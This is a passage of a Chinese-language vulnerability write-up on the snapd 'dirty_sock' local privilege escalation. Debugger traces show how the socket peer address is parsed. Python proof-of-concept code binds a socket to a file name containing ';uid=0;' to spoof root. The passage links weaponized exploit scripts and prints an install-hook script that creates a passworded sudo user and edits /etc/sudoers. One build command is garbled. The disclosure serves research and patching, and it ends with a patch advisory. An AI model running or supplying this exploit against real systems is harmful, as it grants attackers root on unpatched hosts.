但调试信息中字符串末尾的`@`符号是什么？该符号源自何处？我们可以从`remoteAddr`这个变量名中找到线索。在调试器中探索一番后，我们可以看到golang标准库（`net.go`）会返回本地网络地址
**以及** 远程地址，我们可以在调试会话中看到这些信息（`laddr`以及`raddr`）：
    > net.(*conn).LocalAddr() /usr/lib/go-1.10/src/net/net.go:210 (PC: 0x77f65f)
    ...
    => 210:    func (c *conn) LocalAddr() Addr {
    ...
    (dlv) print c.fd
    ...
        laddr: net.Addr(*net.UnixAddr) *{
            Name: "/run/snapd.socket",
            Net: "unix",},
        raddr: net.Addr(*net.UnixAddr) *{Name: "@", Net: "unix"},}
远程地址会被设置为神秘的`@`符号。进一步阅读`man unix`帮助信息后，我们了解到这与“抽象命名空间（abstract
namespace）”有关，用来绑定独立于文件系统的socket。命名空间中的socket开头为`null-byte`（空字节）字符，该字符在终端中通常会显示为`@`。
我们可以创建绑定到我们可控文件名的socket，而不去依赖netcat所使用的抽象套接字命名空间。这样操作应该能影响我们想修改的字符串变量的部分数据，也就是前面显示的`raddr`变量。
通过一些简单的python代码，我们可以创建包含`;uid=0;`字符串的文件名，然后将socket绑定到该文件，最后利用该socket连接到snapd
API。
漏洞利用POC代码片段如下：
    ## Setting a socket name with the payload included
    sockfile = "/tmp/sock;uid=0;"
    ## Bind the socket
    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    client_sock.bind(sockfile)
    ## Connect to the snap daemon
    client_sock.connect('/run/snapd.socket')
现在我们可以在调试器中，再次观察`remoteAddr`变量的值：
    > github.com/snapcore/snapd/daemon.ucrednetGet()
    ...
    =>  41:        for _, token := range strings.Split(remoteAddr, ";") {
    ...
    (dlv) print remoteAddr
    "pid=5275;uid=1000;socket=/run/snapd.socket;/tmp/sock;uid=0;"
很好，这里我们成功注入了一个假的uid（`uid=0`），也就是root用户，在最后一次迭代处理中该字段会覆盖实际的uid值。这样我们就能够访问受包含的API函数。
我们可以在调试器中继续该函数，验证uid是否会被设置为0。delve的输出结果如下：
    > github.com/snapcore/snapd/daemon.ucrednetGet()
    ...
    =>  65:        return pid, uid, socket, err
    ...
    (dlv) print uid
    0
## 四、武器化
###  版本1
[dirty_sockv1](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py)利用的是“POST
/v2/create-user”这个API函数。为了利用该漏洞，我们只需在[Ubuntu
SSO](https://login.ubuntu.com/)上创建一个账户，然后将SSH公钥上传到账户目录中，接下来使用如下命令来利用漏洞（使用我们注册的邮箱和关联的SSH私钥）：
    $ dirty_sockv1.py -u PI:EMAIL -k id_rsa
这种利用方式非常可靠并且可以安全执行，现在我们已经可以获得root权限。
当然这里我们需要能够访问互联网，目标主机也需要开放SSH服务，那么我们是否可以在更加受限的环境中利用漏洞呢？
###  版本2
[dirty_sockv2](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py)使用了“POST
/v2/snaps”
API来侧加载一个snap，该snap中包含一个bash脚本，可以添加一个本地用户。这种利用方式适用于没有运行SSH服务的目标系统，也适用于没有互联网连接的较新版Ubuntu。然而，这里的侧加载方式的确需要一些核心snap依赖，如果缺乏这些依赖，可能会触发snapd服务的更新操作。根据我的测试，我发现这种方式仍然有效，但只能使用
**一次** 。
snap本身运行在沙箱（sandbox）环境中，并且数字签名需要匹配主机已信任的公钥。然而我们可以使用处于开发模式（“devmode”）的snap来降低这些限制条件，这样snap就能像其他应用那样访问操作系统。
此外snap还引入了“hooks”机制，其中“install hook”会在snap安装时运行，并且“install
hook”可以是一个简单的shell脚本。如果snap配置为“devmode”，那么这个hook会在root上下文中运行。
我创建了一个简单的snap，该snap没有其他功能，只是会在安装阶段执行的一个bash脚本。该脚本会运行如下命令：
    useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
    usermod -aG sudo dirty_sock
    echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
上面中的加密字符串实际上是`dirty_sock`文本经过Python的`crypt.crypt()`函数处理后的结果。
创建该snap的具体命令如下所示，我们可以在开发主机（而非目标主机）上执行这些命令。snap创建完毕后，我们可以将其转换为base64文本，以便整合到完整的python利用代码中。
    ## Install necessary tools
    sudo apt install snapcraft -y
    ## Make an empty directory to work with
    cd /tmp
    mkdir dirty_snap
    cd dirty_snap
    ## Initialize the directory as a snap project
    snapcraft init
    ## Set up the install hook
    mkdir snap/hooks
    touch snap/hooks/install
    chmod a+x snap/hooks/install
    ## Write the script we want to execute as root
    cat > snap/hooks/install > /etc/sudoers
    EOF
    ## Configure the snap yaml file
    cat > snap/snapcraft.yaml 
经过base64编码的文本可以存放到`dirty_sock.py`利用代码开头处的`TROJAN_SNAP`全局变量中。
利用程序使用python语言开发，会执行如下操作：
1、创建一个随机文件，文件名中包含`;uid=0;`字符串
2、将一个socket绑定到该文件
3、连接到snapd API
4、删除后门snap（如果上一次执行中断导致snap残留）
5、安装后门snap
6、删除后门snap
7、删除临时socket文件
8、漏洞利用成功
## 五、防护及缓解措施
请及时给系统打补丁，我披露漏洞后snapd团队第一时间就解决了这个问题。